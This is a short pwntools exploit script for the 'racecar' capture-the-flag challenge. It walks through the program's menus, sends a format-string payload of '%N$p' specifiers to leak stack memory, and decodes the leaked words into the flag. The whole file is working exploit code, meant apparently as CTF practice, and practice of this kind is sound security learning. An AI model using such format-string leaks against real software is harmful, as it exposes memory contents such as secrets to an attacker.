#!/usr/bin/env python3
from pwn import *
import pwn
import time, os, traceback, sys, os
import binascii, array
from textwrap import wrap
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath]+argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv,aslr=True, *a, **kw)
# Set up the target binary and the remote server
binary = ELF('racecar')
binPath ="./racecar"
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process(binary.path)
# build in GDB support
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
p=start()
payload = ""
offset =12
end =  23
for i in range (12,23):
    payload+= "%"+str(i)+"$p "
p.recvuntil(b'Name: ')
p.sendline(b'sai')
p.recvuntil(b'Nickname: ')
p.sendline(b'sai')
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')
p.sendline(payload)
p.recv()
response = p.recv()
flag = (response.decode("utf-8").split('m\n'))[1]
flag = flag.split()
recvd_flag=""
for values in flag:
    recvd_flag+=pwn.p32(int(values,16)).decode("utf-8")

print("recieved flag is:",recvd_flag)

